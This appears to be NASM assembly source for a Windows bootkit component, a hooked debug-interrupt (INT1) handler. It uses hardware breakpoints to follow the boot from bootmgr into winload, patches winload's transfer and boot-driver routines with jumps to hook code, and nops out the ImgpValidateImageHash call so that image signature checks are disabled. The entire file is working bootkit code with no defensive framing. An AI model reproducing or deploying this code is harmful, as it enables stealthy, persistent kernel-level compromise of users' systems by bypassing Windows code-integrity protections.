	bits 32
	section .text
	global Idt32Begin
	global OriginalInt1
	extern HookedWinloadXfer
	extern HookedGetBootDrivers
	extern WinloadXferPattern
	extern GetBootDriversPattern
	extern ValidateImagePattern
	extern WinloadXferPatternSize
	extern GetBootDriversPatternSize
	extern ValidateImagePatternSize

IDT_COPY_OFFSET: equ 0x100
SECTOR_SIZE: equ 0x200
BootmgrXferPatternSize: equ (BootmgrXferPatternEnd - BootmgrXferPattern)
	
Idt32Begin:
	pushad
	mov ebx, 0xFFFFFFFF			; offset 2, used to reference labels in this file
	sub ebx, Idt32Begin			; adjust pointer for relocations
	
	xor eax, eax
	mov dr0, eax
	mov dr1, eax
	mov dr7, eax				; disable breakpoints
	mov eax, dr6
	btr eax, 0					; was dr0 triggered?
	mov dr6, eax
	jc Bootmgr16To32
	btr eax, 2					; was dr2 triggered?
	mov dr6, eax
	jc Bootmgr32ToWinload
	jnc HookedInt1End

Bootmgr16To32:
	mov ax, [OriginalInt1]		; unhook int1
	mov [ebx - IDT_COPY_OFFSET + 8], ax
	mov ax, [OriginalInt1 + 2]
	mov [ebx - IDT_COPY_OFFSET + 14], ax

	mov edi, [esp + 0x10]		; get address of bootmgr!BmMain

	mov edx, edi				; patch bootmgr32
FindBootmgrXfer:
	lea esi, [ebx + BootmgrXferPattern]
	inc edx
	mov edi, edx				; restore and increment edi
	mov ecx, BootmgrXferPatternSize
	repe cmpsb					; memcmp(edi, seq, seq_len)
	jnz FindBootmgrXfer
	mov dr2, edi				; dr1 seems to be in use
	mov eax, 32					; enable dr2 - execute
	mov dr7, eax

	clc							; clear CF to use conditional jump (relative)
	jnc HookedInt1End
Bootmgr32ToWinload:
	push ecx
	mov edx, ecx
FindWinloadXfer:				; patch winload
	lea esi, [ebx + WinloadXferPattern]
	inc edx
	mov edi, edx				; restore and increment edi
	mov ecx, WinloadXferPatternSize
	repe cmpsb					; memcmp(edi, seq, seq_len)
	jnz FindWinloadXfer
	sub edi, WinloadXferPatternSize
	lea eax, [ebx + HookedWinloadXfer - 5]
	sub eax, edi
	mov byte[edi], 0xE8	; call
	mov dword[edi + 1], eax
	pop ecx

	push ecx					; find call to OslLoadDrivers
	mov edx, ecx
FindGetBootDrivers:
	lea esi, [ebx + GetBootDriversPattern]
	inc edx
	mov edi, edx				; restore and increment edi
	mov ecx, GetBootDriversPatternSize
	repe cmpsb					; memcmp(edi, seq, seq_len)
	jnz FindGetBootDrivers
	sub edi, 4					; don't clobber rsi!
	lea eax, [ebx + HookedGetBootDrivers - 5]
	sub eax, edi
	mov byte[edi], 0xE9			; jmp
	mov dword[edi + 1], eax
	pop ecx

	mov edx, ecx				; nop out call to ImgpValidateImageHash in ImgpLoadPEImage
FindValidateImage:
	lea esi, [ebx + ValidateImagePattern]
	inc edx
	mov edi, edx				; restore and increment edi
	mov ecx, ValidateImagePatternSize
	repe cmpsb					; memcmp(edi, seq, seq_len)
	jnz FindValidateImage
	sub edi, ValidateImagePatternSize

	mov dword[edi - 5], 0x909090
	mov word[edi - 2], 0xc031	; xor eax, eax

HookedInt1End:
	popad
	iretd

BootmgrXferPattern:
	push ecx
	push esi
	push 0x7F
	pop eax
BootmgrXferPatternEnd:

OriginalInt1:	dd 0